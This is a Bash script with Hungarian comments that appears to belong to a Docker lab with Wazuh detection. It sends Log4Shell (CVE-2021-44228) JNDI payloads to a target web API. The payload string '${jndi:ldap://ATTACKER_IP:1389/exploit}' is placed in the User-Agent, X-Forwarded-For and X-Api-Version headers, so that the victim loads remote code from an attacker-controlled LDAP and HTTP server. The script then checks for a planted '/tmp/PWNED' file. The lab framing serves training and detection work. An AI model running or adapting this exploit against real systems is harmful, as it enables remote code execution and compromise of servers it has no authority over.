#!/bin/bash
# ==============================================
# Log4Shell exploit küldő szkript
# Futtatás: docker exec attacker /attacker/attack.sh
# ==============================================

TARGET="${1:-http://172.20.0.20:8080}"
ATTACKER_IP="${ATTACKER_IP:-172.20.0.10}"

PAYLOAD="\${jndi:ldap://${ATTACKER_IP}:1389/exploit}"

echo "=============================================="
echo " Log4Shell (CVE-2021-44228) Exploit"
echo "=============================================="
echo " Célpont   : $TARGET"
echo " Payload   : $PAYLOAD"
echo " LDAP szerver: ${ATTACKER_IP}:1389"
echo " HTTP szerver: ${ATTACKER_IP}:8888"
echo "=============================================="
echo ""

echo "[1] Normál kérés küldése (baseline)..."
curl -s -o /dev/null -w "HTTP státusz: %{http_code}\n" \
    -H "User-Agent: Mozilla/5.0 (normál kérés)" \
    "$TARGET/api/hello"

sleep 1

echo ""
echo "[2] EXPLOIT KÜLDÉSE – JNDI payload a User-Agent fejlécben..."
echo "    Payload: $PAYLOAD"
echo ""

RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
    -H "User-Agent: ${PAYLOAD}" \
    -H "X-Forwarded-For: ${PAYLOAD}" \
    "$TARGET/api/hello" 2>&1)

HTTP_STATUS=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_STATUS:")

echo "Válasz (HTTP $HTTP_STATUS):"
echo "$BODY"
echo ""

echo "[3] Második kísérlet – X-Api-Version fejlécen keresztül..."
curl -s -o /dev/null -w "HTTP státusz: %{http_code}\n" \
    -H "X-Api-Version: ${PAYLOAD}" \
    "$TARGET/api/hello"

echo ""
echo "=============================================="
echo " Ha az exploit sikeres volt:"
echo "  - Az LDAP szerver logban megjelenik a lookup"
echo "  - A HTTP szerver logban megjelenik a class letöltés"
echo "  - Az áldozaton: /tmp/PWNED_by_log4shell.txt"
echo "  - A Wazuh dashboard-on: Security Alert"
echo ""
echo " Ellenőrzés:"
echo "   docker exec vulnerable-app cat /tmp/PWNED_by_log4shell.txt"
echo "   docker logs attacker"
echo "   Wazuh Dashboard: https://localhost:5601"
echo "=============================================="
